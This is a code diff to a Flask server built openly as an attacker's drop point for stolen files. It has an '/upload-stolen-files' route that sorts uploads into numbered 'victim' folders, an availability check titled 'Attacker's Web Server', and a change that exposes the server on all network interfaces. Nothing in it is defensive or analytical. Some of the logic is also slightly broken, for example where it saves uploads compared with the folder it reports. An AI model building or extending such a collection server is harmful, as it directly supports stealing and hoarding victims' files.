@@ -8,11 +8,12 @@ app = Flask(__name__)
 UPLOAD_FOLDER = 'captured/'
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 victim_index = 1
 
 @app.route('/upload-stolen-files', methods=['POST'])
-def upload_file():
+def upload_stolen_file():
     while True:
         victim_dir = os.path.join(UPLOAD_FOLDER, f"victim-{victim_index}/")
         if not os.path.exists(victim_dir):
@@ -36,9 +37,18 @@ def upload_file():
         file.save(os.path.join(UPLOAD_FOLDER, file.filename))
     return jsonify({'success': f'Files uploaded successfully to directory {victim_dir}'}), 200
 
+@app.route('/check-availability', methods=['GET', 'HEAD'])
+def check_availability():
+    if request.method == 'GET':
+        return '''
+        <!doctype html>
+        <title>Attacker's Web Server</title>
+        <body>Server Found</body>
+        '''
+    return
+
 if __name__ == '__main__':
     # Debugging
-    app.run(debug=True)
-
+    app.run(host='0.0.0.0', port=5000)
 #Specify port
 #Allow port through firewall
